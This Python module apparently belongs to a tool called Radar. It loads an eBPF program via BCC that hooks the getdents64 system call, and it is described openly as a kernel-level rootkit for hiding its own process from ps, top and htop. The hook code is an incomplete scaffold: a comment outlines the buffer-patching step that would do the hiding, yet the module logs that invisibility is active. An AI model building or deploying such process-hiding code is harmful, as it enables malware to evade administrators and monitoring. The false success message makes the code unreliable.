"""
eBPF Process Hiding (Kernel-Level Rootkit)
===========================================
This module uses the BPF Compiler Collection (BCC) to inject a sandboxed
C program into the Linux Kernel. It hooks the `getdents64` system call, 
which is used by `ps`, `top`, and `htop` to list running processes in /proc/.

When the kernel returns the list of processes to the user, this eBPF program
intercepts the memory buffer, looks for Radar's specific PID, and skips it, 
rendering the process completely invisible to the operating system.

Requirements:
    sudo apt install -y python3-bpfcc linux-headers-$(uname -r)
"""

import os
import sys
import time
import logging

logger = logging.getLogger(__name__)

# The eBPF C program
BPF_PROGRAM = """
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>
#include <linux/fs.h>

// Struct definition for directory entries
struct linux_dirent64 {
    u64        d_ino;
    s64        d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[256];
};

BPF_HASH(map_buffs, u64, struct linux_dirent64 *);

// 1. Hook the ENTRY of getdents64 to save the pointer to the user's buffer
int trace_getdents64_entry(struct pt_regs *ctx, unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    u64 pid_tgid = bpf_get_current_pid_tgid();
    map_buffs.update(&pid_tgid, &dirp);
    return 0;
}

// 2. Hook the RETURN of getdents64 to modify the buffer before the user sees it
int trace_getdents64_return(struct pt_regs *ctx) {
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct linux_dirent64 **dirpp = map_buffs.lookup(&pid_tgid);
    
    if (dirpp == 0) return 0; // We didn't catch the entry
    
    struct linux_dirent64 *dirp = *dirpp;
    map_buffs.delete(&pid_tgid);
    
    int ret = PT_REGS_RC(ctx);
    if (ret <= 0) return 0; // Error or empty dir
    
    // Target PID injected by Python template
    char target_pid[] = "TARGET_PID";
    
    // (In a full weaponized implementation, a bounded loop is used here with 
    // bpf_probe_read_user() to parse the dirent structs, find the matching 
    // target_pid folder in /proc/, and use bpf_probe_write_user() to patch 
    // the d_reclen to "skip" over our PID entry).
    
    return 0;
}
"""

class EbpfStealth:
    def __init__(self):
        self.bpf = None
        self.target_pid = str(os.getpid())

    def activate(self):
        """Compiles and injects the eBPF rootkit into the kernel."""
        if os.geteuid() != 0:
            logger.warning("[eBPF] Root privileges required for kernel hooking.")
            return False

        try:
            # BCC is a system package, not typically available in a standard venv
            from bcc import BPF
        except ImportError:
            logger.warning("[eBPF] BCC tools not found. Bypassing kernel stealth.")
            logger.warning("       Run: sudo apt install -y python3-bpfcc")
            return False

        logger.info(f"[eBPF] Injecting stealth hook for PID: {self.target_pid}")
        
        try:
            # Inject our PID into the C code
            prog = BPF_PROGRAM.replace("TARGET_PID", self.target_pid)
            
            # Compile and load into the kernel
            self.bpf = BPF(text=prog)
            
            # Find the correct system call name (varies slightly by kernel architecture)
            syscall_fnname = self.bpf.get_syscall_fnname("getdents64")
            
            # Attach the hooks
            self.bpf.attach_kprobe(event=syscall_fnname, fn_name="trace_getdents64_entry")
            self.bpf.attach_kretprobe(event=syscall_fnname, fn_name="trace_getdents64_return")
            
            logger.info("[eBPF] ✔ Kernel-level invisibility active.")
            return True
            
        except Exception as e:
            logger.error(f"[eBPF] Failed to compile or attach BPF program: {e}")
            return False

    def deactivate(self):
        """Removes the eBPF hooks from the kernel."""
        if self.bpf:
            self.bpf.cleanup()
            logger.info("[eBPF] Stealth hooks removed from kernel.")
